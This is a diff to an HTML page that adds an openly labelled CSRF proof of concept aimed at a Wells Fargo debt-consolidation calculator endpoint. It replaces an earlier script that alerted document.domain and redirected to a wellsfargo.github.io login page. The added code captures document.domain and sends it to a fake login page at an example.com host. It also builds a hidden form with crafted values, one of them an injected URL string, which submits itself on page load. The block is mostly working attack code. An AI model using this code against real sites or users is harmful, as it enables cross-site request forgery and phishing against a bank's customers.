@@ -2809,12 +2809,47 @@
 		
 	</script>  
 
-<script>
-    alert("Document Domain: " + document.domain);
-    setTimeout(function() {
-        window.location.href = 'https://wellsfargo.github.io/login.html';
-    }, 1000);  // Wait 1 second (1000 milliseconds) before redirecting
-</script>
+<html>
+  <title>CSRF PoC for Document Domain</title>
+  <body>
+    <script>
+      // Check if we can access the document.domain from Wells Fargo
+      try {
+        var docDomain = document.domain;
+        alert('Document Domain: ' + docDomain);  // Display the document domain
+
+        // Redirect to a fake login page with captured document.domain as a query parameter
+        var fakeLoginUrl = "https://www.example.com/fake-login?domain=" + encodeURIComponent(docDomain);
+        
+        // Redirect the user to the fake login page after capturing document.domain
+        window.location.href = fakeLoginUrl;
+      } catch (e) {
+        alert('Unable to access document.domain due to cross-origin restrictions.');
+      }
+    </script>
+
+    <!-- Your CSRF form here -->
+    <form action="https://www.wellsfargo.com/personal-loans/debt-consolidation-calculator/" enctype="application/x-www-form-urlencoded" id="xsrfprobe_csrfpoc" method="POST">
+      <input name="debtConCalcDetailsCommandList[0].apr" type="hidden" value="https://www.wellsfargo.com/https://www.wellsfargo.comh1testing"/>
+      <input name="debtConCalcDetailsCommandList[0].currentBalance" type="hidden" value=""/>
+      <input name="debtConCalcDetailsCommandList[0].monthlyPayment" type="hidden" value="1000"/>
+      <input name="debtConCalcDetailsCommandList[1].apr" type="hidden" value="100"/>
+      <input name="debtConCalcDetailsCommandList[1].currentBalance" type="hidden" value="1000000"/>
+      <input name="debtConCalcDetailsCommandList[1].monthlyPayment" type="hidden" value="100"/>
+      <input name="debtConCalcDetailsCommandList[2].apr" type="hidden" value="100000"/>
+      <input name="debtConCalcDetailsCommandList[2].currentBalance" type="hidden" value="10000000"/>
+      <input name="debtConCalcDetailsCommandList[2].monthlyPayment" type="hidden" value="100"/>
+      <input name="debtConCalcDetailsCommandList[3].apr" type="hidden" value="0"/>
+      <input name="debtConCalcDetailsCommandList[3].currentBalance" type="hidden" value="010"/>
+      <input name="debtConCalcDetailsCommandList[3].monthlyPayment" type="hidden" value="10"/>
+    </form>
+  </body>
+
+  <script>
+    // Automatically submit the CSRF form to trigger the request
+    document.getElementById("xsrfprobe_csrfpoc").submit();
+  </script>
+</html>
 
 
 
